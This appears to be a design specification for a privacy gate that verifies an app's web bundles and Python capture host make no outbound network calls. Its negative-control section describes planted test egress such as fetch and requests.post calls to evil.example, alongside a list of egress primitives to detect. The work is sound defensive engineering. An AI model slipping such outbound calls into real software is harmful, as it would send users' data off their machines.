Tepna · No-Network Invariant Gate — the privacy analogue of verify-provenance

The flagship privacy property: no shipped surface initiates network egress — nothing about the user leaves their machine. This promotes CLAUDE.md's "100% local, no CDN" convention into an enforced, self-verifying property. Scope = the two web-app surfaces a user actually opens: the 8 self-contained bundles (from BUILD-MANIFEST.json) and the 2 unbundled orchestrators — Data Unifier.html / OverDex.html — whose real code lives in loose <script src> modules (adapters, DSPs, signal-orchestrate.js, the app JS), each of which is fetched and scanned too. Egress is classified by target origin: a remote/absolute-URL target (or a transport-only primitive — XMLHttpRequest, WebSocket, EventSource, sendBeacon) is a HARD FAIL; a same-origin / relative / data: / blob: load of a bundled asset is allowed and listed; a remote <a href> is a user navigation, not egress, and is listed separately. Layer 2 (runtime) boots each surface in a trapped iframe whose egress primitives throw on a cross-origin target and asserts none fired. Layer 3 (Python — static lens) reads the capture-host/ sources: a browser gate cannot execute Python, so this is a text lens (outbound HTTP client → FAIL; BLE / local file / LAN file-server → allowed) with a CI follow-up noted. Negative control plants egress in every lens and asserts the gate catches it (anti-vacuous-pass). Verdict: window.__noNetworkOK (+ __staticOK/__runtimeOK/__pythonOK/__canaryOK). Adds no runtime behavior (no re-bundle).

3 · Python surface — capture-host/ static lens (a browser gate can't execute Python)

Different execution surface. The bedside capture host runs Python on a Raspberry Pi — not in this browser — so this layer is a static text lens only, and is not authoritative: the real check belongs in CI (a Python/Node import-allowlist over capture-host/). By design the host is BLE-in → disk-out → LAN file-server (Caddy on tepna.local); "no egress" here means no outbound internet client (no requests/urllib/ cloud SDK phoning data out) — serving bundles on the LAN is not egress.

4 · Negative control — the gate must catch planted egress (anti-vacuous-pass)

A canary that ships with the gate, exercising every lens. Static: a test-only fixture with a real fetch("https://evil.example/x") (+ remote <script src>, WebSocket, sendBeacon, @import) the scanner must flag, plus a benign local string it must not (and a remote <a href> it must classify as nav, not egress). Runtime: a module that attempts one remote fetch/WebSocket/sendBeacon against the trap (must throw) + one local fetch (must be allowed). Python: a planted requests.post("https://evil.example") the Python lens must flag. Any miss HARD-FAILS the whole gate.
